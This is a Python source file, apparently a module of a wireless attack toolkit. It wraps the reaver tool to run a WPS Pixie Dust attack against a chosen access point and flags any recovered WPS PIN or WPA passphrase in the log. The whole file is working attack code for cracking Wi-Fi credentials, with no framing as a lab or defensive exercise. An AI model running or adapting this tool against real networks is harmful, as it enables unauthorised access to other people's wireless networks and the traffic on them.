import subprocess
import time
from threading import Event, Thread

from ..context import Module
from ..iface import arac_var


class WpsModule(Module):
    name = "wps"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.proc = None
        self.bssid = None
        self.kanal = None
        self.thread = None
        self.dur = Event()

    def on(self, bssid=None, channel=None, *a):
        if self.active:
            self.ctx.log("[wps] already active", "warn")
            return
        if not bssid:
            self.ctx.log("[wps] usage: module wps on <bssid> [channel]", "err")
            return
        if not arac_var("reaver"):
            self.ctx.log("[wps] 'reaver' yok (apt install reaver)", "err")
            return
        self.bssid = bssid
        try:
            self.kanal = int(channel) if channel else None
        except Exception:
            self.kanal = None
        self.dur.clear()
        self.active = True
        self.thread = Thread(target=self._run, daemon=True)
        self.thread.start()
        self.ctx.log(f"[wps] Pixie Dust {bssid}", "ok")

    def _run(self):
        cmd = ["reaver", "-i", self.ctx.iface, "-b", self.bssid,
               "-K", "1", "-vv"]
        if self.kanal:
            cmd += ["-c", str(self.kanal)]
        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, text=True)
            for line in self.proc.stdout:
                if self.dur.is_set():
                    break
                line = line.rstrip()
                if not line:
                    continue
                self.ctx.log(f"[wps] {line}", "dim")
                if "WPS PIN" in line or "WPA PSK" in line:
                    self.ctx.log(f"[wps] *** {line} ***", "ok")
        except Exception as e:
            self.ctx.log(f"[wps] reaver err: {e}", "err")
        finally:
            if self.proc and self.proc.poll() is None:
                try:
                    self.proc.terminate()
                except Exception:
                    pass

    def off(self):
        if not self.active:
            return
        self.dur.set()
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
            except Exception:
                pass
        if self.thread:
            self.thread.join(timeout=3)
        self.active = False
        self.ctx.log("[wps] stopped", "ok")

    def once(self, bssid, channel=None, duration=60):
        self.on(bssid, channel)

        def _stop():
            time.sleep(duration)
            self.off()
        Thread(target=_stop, daemon=True).start()

    def status(self):
        return f"active ({self.bssid})" if self.active else "off"
